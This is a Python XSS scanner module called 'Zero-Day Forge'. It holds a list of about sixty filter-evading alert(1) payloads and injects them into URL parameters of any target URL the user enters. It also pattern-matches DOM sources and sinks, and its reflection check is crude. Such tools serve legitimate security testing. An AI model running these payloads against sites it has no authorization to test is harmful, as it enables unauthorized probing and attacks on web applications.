import re
import logging
from typing import List, Dict, Optional, Set
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from bs4 import BeautifulSoup
import asyncio
import sys
import os

# Handle both package import and direct execution
if __name__ == "__main__":
    sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..', '..')))
    from src.core.engine import AdvancedScanner, Vulnerability, Severity, VulnType
else:
    from ..core.engine import AdvancedScanner, Vulnerability, Severity, VulnType


class XSSModule:
    def __init__(self, scanner: AdvancedScanner):
        self.scanner = scanner
        self.logger = logging.getLogger(__name__)
        self.payloads = self._load_payloads()
        self.dom_sink_patterns = [
            r'document\.write',
            r'document\.writeln',
            r'innerHTML',
            r'outerHTML',
            r'eval\(',
            r'setTimeout\(',
            r'setInterval\(',
            r'location\.href',
            r'location\.search',
            r'location\.hash',
            r'document\.URL',
            r'document\.location'
        ]
        self.dom_source_patterns = [
            r'document\.URL',
            r'document\.URI',
            r'document\.documentURI',
            r'document\.URLUnencoded',
            r'document\.baseURI',
            r'location',
            r'location\.href',
            r'location\.search',
            r'location\.hash'
        ]

    def _load_payloads(self) -> List[str]:
        return [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '<body onload=alert(1)>',
            '<input onfocus=alert(1) autofocus>',
            '<select onfocus=alert(1) autofocus>',
            '<textarea onfocus=alert(1) autofocus>',
            '<keygen onfocus=alert(1) autofocus>',
            '<video><source onerror=alert(1)>',
            '<audio><source onerror=alert(1)>',
            '<frame onload=alert(1)>',
            '<iframe onload=alert(1)>',
            '<object onerror=alert(1)>',
            '<embed src=x onerror=alert(1)>',
            '<applet onerror=alert(1)>',
            'javascript:alert(1)',
            'javascript&#58;alert(1)',
            'javascript&#x3a;alert(1)',
            '&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)',
            '&lt;script&gt;alert(1)&lt;/script&gt;',
            '&#60;script&#62;alert(1)&#60;/script&#62;',
            '&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;',
            '%3Cscript%3Ealert(1)%3C/script%3E',
            '%253Cscript%253Ealert(1)%253C/script%253E',
            '<scr<script>ipt>alert(1)</scr</script>ipt>',
            '<sCrIpT>alert(1)</sCrIpT>',
            '<script src=xss.js></script>',
            '"><script>alert(1)</script>',
            '\'"><script>alert(1)</script>',
            '<img src=x onerror=alert`1`>',
            '<img src=x onerror=alert&lpar;1&rpar;>',
            '<img src=x onerror=alert&#40;1&#41;>',
            '<img src=x onerror=alert&#x28;1&#x29;>',
            '<div style=xss:expr/*XSS*/ession(alert(1))>',
            '<svg><script>alert(1)</script></svg>',
            '<math><script>alert(1)</script></math>',
            '<xss id=x onfocus=alert(1) tabindex=1>#x',
            '<isindex action=x onmouseover=alert(1)>',
            '<form action=x><button formaction=javascript:alert(1)>XSS</button></form>',
            '<table background=x onerror=alert(1)>',
            '<td background=x onerror=alert(1)>',
            '<th background=x onerror=alert(1)>',
            '<meta http-equiv=refresh content=0;url=javascript:alert(1)>',
            '<a href=javascript:alert(1)>XSS</a>',
            '<area href=javascript:alert(1)>',
            '<base href=javascript:alert(1)//>',
            '<link href=javascript:alert(1)>',
            '<command onclick=alert(1)>',
            '<details ontoggle=alert(1) open>',
            '<dialog open onclose=alert(1)><form method=dialog><button>Close</button></form></dialog>',
            '<marquee onstart=alert(1)>XSS</marquee>',
            '<menuitem onclick=alert(1)>',
            '<meter onmouseover=alert(1)>',
            '<progress onmouseover=alert(1)>',
            '<time onmouseover=alert(1)>',
            '<wbr onmouseover=alert(1)>',
            '<animate onbegin=alert(1) attributeName=x dur=1>',
            '<set onbegin=alert(1) attributeName=x dur=1>',
            '<animateColor onbegin=alert(1) attributeName=x dur=1>',
            '<animateMotion onbegin=alert(1) dur=1>',
            '<animateTransform onbegin=alert(1) attributeName=x dur=1>'
        ]

    async def scan(self, target_url: str):
        self.logger.info(f"Starting XSS scan on {target_url}")
        await self._scan_common_params(target_url)
        await self._scan_dom_xss(target_url)

    async def _scan_parameters(self, url: str, params: Dict[str, List[str]]):
        for param_name, param_values in params.items():
            for payload in self.payloads[:20]:
                test_url = self._inject_payload(url, param_name, payload)
                await self._test_xss(test_url, param_name, payload)
                await asyncio.sleep(self.scanner.config.get('delay', 0.1))

    async def _scan_common_params(self, url: str):
        common_params = ['q', 'search', 'id', 'name', 'page', 'lang', 'category', 'product', 'user', 'email']
        parsed = urlparse(url)
        existing_params = parse_qs(parsed.query)
        
        if existing_params:
            await self._scan_parameters(url, existing_params)
        else:
            for param in common_params:
                for payload in self.payloads[:10]:
                    test_params = {param: payload}
                    new_query = urlencode(test_params, doseq=True)
                    test_url = urlunparse((
                        parsed.scheme,
                        parsed.netloc,
                        parsed.path,
                        parsed.params,
                        new_query,
                        parsed.fragment
                    ))
                    await self._test_xss(test_url, param, payload)
                    await asyncio.sleep(self.scanner.config.get('delay', 0.1))

    async def _scan_dom_xss(self, url: str):
        try:
            response = await self.scanner.request(url)
            if response.get('status') != 200:
                return
            
            soup = BeautifulSoup(response.get('content', ''), 'html.parser')
            scripts = soup.find_all('script')
            
            for script in scripts:
                script_content = script.string
                if not script_content:
                    continue
                
                for source in self.dom_source_patterns:
                    if re.search(source, script_content):
                        for sink in self.dom_sink_patterns:
                            if re.search(sink, script_content):
                                vuln = Vulnerability(
                                    id=self.scanner.generate_vuln_id(),
                                    type=VulnType.XSS,
                                    severity=Severity.HIGH,
                                    url=url,
                                    parameter=None,
                                    payload=None,
                                    evidence=f"Source: {source}, Sink: {sink}",
                                    description="Potential DOM-based XSS vulnerability detected",
                                    remediation="Sanitize all user input before using it in DOM operations",
                                    cwe_id="CWE-79",
                                    cvss_score=6.1
                                )
                                self.scanner.add_vulnerability(vuln)
                                break
        except Exception as e:
            self.logger.error(f"Error in DOM XSS scan: {str(e)}")

    def _inject_payload(self, url: str, param_name: str, payload: str) -> str:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param_name] = [payload]
        new_query = urlencode(params, doseq=True)
        return urlunparse((
            parsed.scheme,
            parsed.netloc,
            parsed.path,
            parsed.params,
            new_query,
            parsed.fragment
        ))

    async def _test_xss(self, test_url: str, param: str, payload: str):
        try:
            response = await self.scanner.request(test_url)
            content = response.get('content', '')
            
            if self._is_executable_context(content, payload):
                vuln = Vulnerability(
                    id=self.scanner.generate_vuln_id(),
                    type=VulnType.XSS,
                    severity=Severity.HIGH,
                    url=test_url,
                    parameter=param,
                    payload=payload,
                    evidence=content[:500],
                    description="Reflected XSS vulnerability detected",
                    remediation="Sanitize and validate all user input. Use Content Security Policy.",
                    cwe_id="CWE-79",
                    cvss_score=6.1
                )
                self.scanner.add_vulnerability(vuln)
        except Exception as e:
            self.logger.error(f"Error testing XSS: {str(e)}")

    def _is_executable_context(self, html: str, payload: str) -> bool:
        return payload in html


if __name__ == "__main__":
    print("="*60)
    print("         Zero-Day Forge - XSS Scanner")
    print("="*60)
    
    # Get target URL
    if len(sys.argv) < 2:
        target_url = input("\nEnter target URL to scan: ").strip()
        while not target_url:
            target_url = input("Please enter a valid URL: ").strip()
    else:
        target_url = sys.argv[1]
    
    # Add protocol if missing
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'https://' + target_url
    
    print(f"\nStarting XSS scan on: {target_url}")
    print("="*60 + "\n")
    
    scanner = AdvancedScanner()
    module = XSSModule(scanner)
    
    async def run_scan():
        await scanner.init_session()
        try:
            await module.scan(target_url)
            print("\n" + "="*60)
            print(f"Scan complete! Found {len(scanner.vulnerabilities)} XSS vulnerabilities.")
            if scanner.vulnerabilities:
                print("\nVulnerabilities found:")
                for i, vuln in enumerate(scanner.vulnerabilities, 1):
                    print(f"\n{i}. {vuln.type.value} ({vuln.severity.value})")
                    print(f"   URL: {vuln.url}")
                    if vuln.parameter:
                        print(f"   Parameter: {vuln.parameter}")
                    if vuln.payload:
                        print(f"   Payload: {vuln.payload}")
            print("="*60)
        finally:
            await scanner.close_session()
    
    asyncio.run(run_scan())
